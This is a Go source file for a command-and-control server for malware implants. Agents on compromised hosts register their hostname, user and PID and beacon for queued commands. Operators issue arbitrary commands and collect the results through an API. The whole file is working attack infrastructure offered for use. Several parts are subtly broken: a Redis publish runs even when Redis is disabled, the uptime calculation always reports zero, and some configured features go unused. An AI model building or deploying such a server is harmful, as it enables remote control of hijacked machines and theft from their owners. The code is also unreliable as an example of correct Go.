package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/go-redis/redis/v8"
	"github.com/google/uuid"
	"gorm.io/driver/postgres"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"
	"gorm.io/gorm/logger"
)

// ============================================================================
// DATA MODELS
// ============================================================================

type Agent struct {
	ID           string    `gorm:"primaryKey" json:"id"`
	Hostname     string    `json:"hostname"`
	Username     string    `json:"username"`
	OS           string    `json:"os"`
	Architecture string    `json:"architecture"`
	IP           string    `json:"ip"`
	PID          int       `json:"pid"`
	FirstSeen    time.Time `json:"first_seen"`
	LastSeen     time.Time `json:"last_seen"`
	Active       bool      `json:"active"`
}

type Task struct {
	ID          uint       `gorm:"primaryKey" json:"id"`
	AgentID     string     `gorm:"index" json:"agent_id"`
	Command     string     `json:"command"`
	Arguments   string     `json:"arguments"`
	Status      string     `json:"status"` // pending, sent, completed, failed
	Result      string     `json:"result"`
	CreatedAt   time.Time  `json:"created_at"`
	CompletedAt *time.Time `json:"completed_at,omitempty"`
}

type Operator struct {
	ID        uint   `gorm:"primaryKey"`
	Username  string `gorm:"uniqueIndex"`
	APIKey    string `gorm:"uniqueIndex"`
	CreatedAt time.Time
	LastLogin *time.Time
}

// ============================================================================
// SERVER CONFIGURATION
// ============================================================================

type ServerConfig struct {
	HTTPPort    int
	HTTPSPort   int
	DNSPort     int
	DatabaseURL string
	RedisURL    string
	TLSCertFile string
	TLSKeyFile  string
	MaxAgents   int
	LogLevel    string
}

func DefaultConfig() *ServerConfig {
	return &ServerConfig{
		HTTPPort:    8080,
		HTTPSPort:   443,
		DNSPort:     53,
		DatabaseURL: getEnv("DATABASE_URL", "sqlite:c2phantom.db"),
		RedisURL:    getEnv("REDIS_URL", ""),
		TLSCertFile: getEnv("TLS_CERT", "server.crt"),
		TLSKeyFile:  getEnv("TLS_KEY", "server.key"),
		MaxAgents:   10000,
		LogLevel:    getEnv("LOG_LEVEL", "info"),
	}
}

func getEnv(key, fallback string) string {
	if value := os.Getenv(key); value != "" {
		return value
	}
	return fallback
}

// ============================================================================
// C2 SERVER
// ============================================================================

type C2Server struct {
	config     *ServerConfig
	db         *gorm.DB
	redis      *redis.Client
	router     *gin.Engine
	agents     sync.Map // map[string]*Agent
	taskQueues sync.Map // map[string]chan *Task
	shutdown   chan os.Signal
	wg         sync.WaitGroup
	ctx        context.Context
	cancel     context.CancelFunc
}

func NewC2Server(config *ServerConfig) (*C2Server, error) {
	ctx, cancel := context.WithCancel(context.Background())

	server := &C2Server{
		config:   config,
		shutdown: make(chan os.Signal, 1),
		ctx:      ctx,
		cancel:   cancel,
	}

	// Initialize database
	if err := server.initDatabase(); err != nil {
		return nil, fmt.Errorf("database init failed: %w", err)
	}

	// Initialize Redis
	if err := server.initRedis(); err != nil {
		return nil, fmt.Errorf("redis init failed: %w", err)
	}

	// Initialize router
	server.initRouter()

	log.Println("✓ C2 Server initialized successfully")
	return server, nil
}

func (s *C2Server) initDatabase() error {
	logLevel := logger.Silent
	if s.config.LogLevel == "debug" {
		logLevel = logger.Info
	}

	var dialector gorm.Dialector
	
	// Support both SQLite and PostgreSQL
	if strings.HasPrefix(s.config.DatabaseURL, "sqlite:") {
		dbPath := strings.TrimPrefix(s.config.DatabaseURL, "sqlite:")
		dialector = sqlite.Open(dbPath)
		log.Printf("Using SQLite database: %s", dbPath)
	} else {
		dialector = postgres.Open(s.config.DatabaseURL)
		log.Println("Using PostgreSQL database")
	}

	db, err := gorm.Open(dialector, &gorm.Config{
		Logger: logger.Default.LogMode(logLevel),
	})
	if err != nil {
		return err
	}

	// Auto migrate schemas
	if err := db.AutoMigrate(&Agent{}, &Task{}, &Operator{}); err != nil {
		return err
	}

	s.db = db
	log.Println("✓ Database connected and migrated")
	return nil
}

func (s *C2Server) initRedis() error {
	// Skip Redis if URL is empty
	if s.config.RedisURL == "" {
		log.Println("⚠ Redis disabled - using in-memory queues")
		return nil
	}

	s.redis = redis.NewClient(&redis.Options{
		Addr:     s.config.RedisURL,
		Password: "",
		DB:       0,
	})

	ctx, cancel := context.WithTimeout(s.ctx, 5*time.Second)
	defer cancel()

	if err := s.redis.Ping(ctx).Err(); err != nil {
		log.Printf("⚠ Redis connection failed: %v - using in-memory queues", err)
		s.redis = nil // Disable Redis, use in-memory
		return nil
	}

	log.Println("✓ Redis connected")
	return nil
}

func (s *C2Server) initRouter() {
	if s.config.LogLevel != "debug" {
		gin.SetMode(gin.ReleaseMode)
	}

	s.router = gin.New()
	s.router.Use(gin.Recovery())
	s.router.Use(s.loggingMiddleware())
	s.router.Use(s.corsMiddleware())

	// Agent endpoints
	agents := s.router.Group("/api/v1/agents")
	{
		agents.POST("/register", s.handleAgentRegister)
		agents.POST("/:id/beacon", s.handleAgentBeacon)
		agents.POST("/:id/results", s.handleTaskResults)
		agents.GET("/:id/tasks", s.handleGetTasks)
	}

	// Operator endpoints (require API key)
	api := s.router.Group("/api/v1")
	api.Use(s.authMiddleware())
	{
		api.GET("/agents", s.handleListAgents)
		api.GET("/agents/:id", s.handleGetAgent)
		api.DELETE("/agents/:id", s.handleDeleteAgent)

		api.POST("/tasks", s.handleCreateTask)
		api.GET("/tasks", s.handleListTasks)
		api.GET("/tasks/:id", s.handleGetTask)

		api.GET("/stats", s.handleGetStats)
	}

	// Health check
	s.router.GET("/health", func(c *gin.Context) {
		c.JSON(200, gin.H{"status": "ok"})
	})
}

// ============================================================================
// MIDDLEWARE
// ============================================================================

func (s *C2Server) loggingMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		start := time.Now()
		c.Next()
		duration := time.Since(start)

		log.Printf("[%s] %s %s - %d (%v)",
			c.Request.Method,
			c.Request.URL.Path,
			c.ClientIP(),
			c.Writer.Status(),
			duration,
		)
	}
}

func (s *C2Server) corsMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-API-Key")

		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(204)
			return
		}

		c.Next()
	}
}

func (s *C2Server) authMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		apiKey := c.GetHeader("X-API-Key")
		if apiKey == "" {
			c.JSON(401, gin.H{"error": "Missing API key"})
			c.Abort()
			return
		}

		var operator Operator
		if err := s.db.Where("api_key = ?", apiKey).First(&operator).Error; err != nil {
			c.JSON(401, gin.H{"error": "Invalid API key"})
			c.Abort()
			return
		}

		now := time.Now()
		operator.LastLogin = &now
		s.db.Save(&operator)

		c.Set("operator", &operator)
		c.Next()
	}
}

// ============================================================================
// AGENT HANDLERS
// ============================================================================

func (s *C2Server) handleAgentRegister(c *gin.Context) {
	var req struct {
		Hostname     string            `json:"hostname"`
		Username     string            `json:"username"`
		OS           string            `json:"os"`
		Architecture string            `json:"architecture"`
		PID          int               `json:"pid"`
		Metadata     map[string]string `json:"metadata"`
	}

	if err := c.BindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	agent := &Agent{
		ID:           uuid.New().String(),
		Hostname:     req.Hostname,
		Username:     req.Username,
		OS:           req.OS,
		Architecture: req.Architecture,
		IP:           c.ClientIP(),
		PID:          req.PID,
		FirstSeen:    time.Now(),
		LastSeen:     time.Now(),
		Active:       true,
	}

	if err := s.db.Create(agent).Error; err != nil {
		c.JSON(500, gin.H{"error": "Failed to register agent"})
		return
	}

	// Create task queue for agent
	s.taskQueues.Store(agent.ID, make(chan *Task, 100))
	s.agents.Store(agent.ID, agent)

	log.Printf("✓ Agent registered: %s (%s@%s)", agent.ID, agent.Username, agent.Hostname)

	c.JSON(200, gin.H{
		"success":         true,
		"agent_id":        agent.ID,
		"message":         "Agent registered successfully",
		"beacon_interval": 60,
	})
}

func (s *C2Server) handleAgentBeacon(c *gin.Context) {
	agentID := c.Param("id")

	var agent Agent
	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err != nil {
		c.JSON(404, gin.H{"error": "Agent not found"})
		return
	}

	// Update last seen
	agent.LastSeen = time.Now()
	agent.Active = true
	s.db.Save(&agent)

	// Get pending tasks
	var tasks []Task
	s.db.Where("agent_id = ? AND status = ?", agentID, "pending").
		Order("created_at asc").
		Limit(10).
		Find(&tasks)

	// Mark tasks as sent
	for i := range tasks {
		tasks[i].Status = "sent"
		s.db.Save(&tasks[i])
	}

	c.JSON(200, gin.H{
		"tasks":           tasks,
		"beacon_interval": 60,
		"terminate":       false,
	})
}

func (s *C2Server) handleGetTasks(c *gin.Context) {
	agentID := c.Param("id")

	var tasks []Task
	s.db.Where("agent_id = ? AND status IN ?", agentID, []string{"pending", "sent"}).
		Order("created_at asc").
		Find(&tasks)

	c.JSON(200, tasks)
}

func (s *C2Server) handleTaskResults(c *gin.Context) {
	agentID := c.Param("id")

	var req struct {
		TaskID  uint   `json:"task_id"`
		Success bool   `json:"success"`
		Output  string `json:"output"`
		Error   string `json:"error"`
	}

	if err := c.BindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	var task Task
	if err := s.db.Where("id = ? AND agent_id = ?", req.TaskID, agentID).First(&task).Error; err != nil {
		c.JSON(404, gin.H{"error": "Task not found"})
		return
	}

	now := time.Now()
	task.CompletedAt = &now
	if req.Success {
		task.Status = "completed"
		task.Result = req.Output
	} else {
		task.Status = "failed"
		task.Result = req.Error
	}

	s.db.Save(&task)

	// Publish to Redis for real-time updates
	data, _ := json.Marshal(task)
	s.redis.Publish(s.ctx, fmt.Sprintf("task:%d", task.ID), data)

	c.JSON(200, gin.H{"success": true})
}

// ============================================================================
// OPERATOR HANDLERS
// ============================================================================

func (s *C2Server) handleListAgents(c *gin.Context) {
	var agents []Agent
	query := s.db

	if active := c.Query("active"); active == "true" {
		query = query.Where("active = ?", true)
	}

	query.Order("last_seen desc").Find(&agents)

	c.JSON(200, agents)
}

func (s *C2Server) handleGetAgent(c *gin.Context) {
	agentID := c.Param("id")

	var agent Agent
	if err := s.db.Where("id = ?", agentID).First(&agent).Error; err != nil {
		c.JSON(404, gin.H{"error": "Agent not found"})
		return
	}

	c.JSON(200, agent)
}

func (s *C2Server) handleDeleteAgent(c *gin.Context) {
	agentID := c.Param("id")

	if err := s.db.Where("id = ?", agentID).Delete(&Agent{}).Error; err != nil {
		c.JSON(500, gin.H{"error": "Failed to delete agent"})
		return
	}

	// Also delete tasks
	s.db.Where("agent_id = ?", agentID).Delete(&Task{})

	c.JSON(200, gin.H{"success": true})
}

func (s *C2Server) handleCreateTask(c *gin.Context) {
	var req struct {
		AgentID   string   `json:"agent_id" binding:"required"`
		Command   string   `json:"command" binding:"required"`
		Arguments []string `json:"arguments"`
	}

	if err := c.BindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	// Verify agent exists
	var agent Agent
	if err := s.db.Where("id = ?", req.AgentID).First(&agent).Error; err != nil {
		c.JSON(404, gin.H{"error": "Agent not found"})
		return
	}

	argsJSON, _ := json.Marshal(req.Arguments)
	task := &Task{
		AgentID:   req.AgentID,
		Command:   req.Command,
		Arguments: string(argsJSON),
		Status:    "pending",
		CreatedAt: time.Now(),
	}

	if err := s.db.Create(task).Error; err != nil {
		c.JSON(500, gin.H{"error": "Failed to create task"})
		return
	}

	log.Printf("✓ Task created: %d for agent %s (%s)", task.ID, agent.ID, req.Command)

	c.JSON(200, task)
}

func (s *C2Server) handleListTasks(c *gin.Context) {
	var tasks []Task
	query := s.db

	if agentID := c.Query("agent_id"); agentID != "" {
		query = query.Where("agent_id = ?", agentID)
	}

	if status := c.Query("status"); status != "" {
		query = query.Where("status = ?", status)
	}

	query.Order("created_at desc").Limit(100).Find(&tasks)

	c.JSON(200, tasks)
}

func (s *C2Server) handleGetTask(c *gin.Context) {
	taskID := c.Param("id")

	var task Task
	if err := s.db.Where("id = ?", taskID).First(&task).Error; err != nil {
		c.JSON(404, gin.H{"error": "Task not found"})
		return
	}

	c.JSON(200, task)
}

func (s *C2Server) handleGetStats(c *gin.Context) {
	var totalAgents int64
	var activeAgents int64
	var totalTasks int64
	var pendingTasks int64

	s.db.Model(&Agent{}).Count(&totalAgents)
	s.db.Model(&Agent{}).Where("active = ?", true).Count(&activeAgents)
	s.db.Model(&Task{}).Count(&totalTasks)
	s.db.Model(&Task{}).Where("status = ?", "pending").Count(&pendingTasks)

	c.JSON(200, gin.H{
		"total_agents":  totalAgents,
		"active_agents": activeAgents,
		"total_tasks":   totalTasks,
		"pending_tasks": pendingTasks,
		"uptime":        time.Since(time.Now()).String(),
	})
}

// ============================================================================
// SERVER LIFECYCLE
// ============================================================================

func (s *C2Server) Start() error {
	signal.Notify(s.shutdown, os.Interrupt, syscall.SIGTERM)

	// Start HTTP server
	s.wg.Add(1)
	go s.startHTTPServer()

	// Start HTTPS server (if certs available)
	if _, err := os.Stat(s.config.TLSCertFile); err == nil {
		s.wg.Add(1)
		go s.startHTTPSServer()
	}

	// Start background workers
	s.wg.Add(1)
	go s.agentCleanupWorker()

	log.Printf("✓ C2 Server started successfully")
	log.Printf("  HTTP:  :%d", s.config.HTTPPort)
	log.Printf("  HTTPS: :%d", s.config.HTTPSPort)

	// Wait for shutdown signal
	<-s.shutdown
	log.Println("Shutting down gracefully...")

	s.cancel()
	s.wg.Wait()

	return nil
}

func (s *C2Server) startHTTPServer() {
	defer s.wg.Done()

	addr := fmt.Sprintf(":%d", s.config.HTTPPort)
	server := &http.Server{
		Addr:    addr,
		Handler: s.router,
	}

	if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("HTTP server error: %v", err)
	}
}

func (s *C2Server) startHTTPSServer() {
	defer s.wg.Done()

	addr := fmt.Sprintf(":%d", s.config.HTTPSPort)

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
	}

	server := &http.Server{
		Addr:      addr,
		Handler:   s.router,
		TLSConfig: tlsConfig,
	}

	if err := server.ListenAndServeTLS(s.config.TLSCertFile, s.config.TLSKeyFile); err != nil && err != http.ErrServerClosed {
		log.Fatalf("HTTPS server error: %v", err)
	}
}

func (s *C2Server) agentCleanupWorker() {
	defer s.wg.Done()

	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			// Mark agents as inactive if not seen in 5 minutes
			cutoff := time.Now().Add(-5 * time.Minute)
			s.db.Model(&Agent{}).
				Where("last_seen < ? AND active = ?", cutoff, true).
				Update("active", false)
		}
	}
}

// ============================================================================
// MAIN
// ============================================================================

func main() {
	config := DefaultConfig()

	server, err := NewC2Server(config)
	if err != nil {
		log.Fatalf("Failed to initialize server: %v", err)
	}

	if err := server.Start(); err != nil {
		log.Fatalf("Server error: %v", err)
	}
}
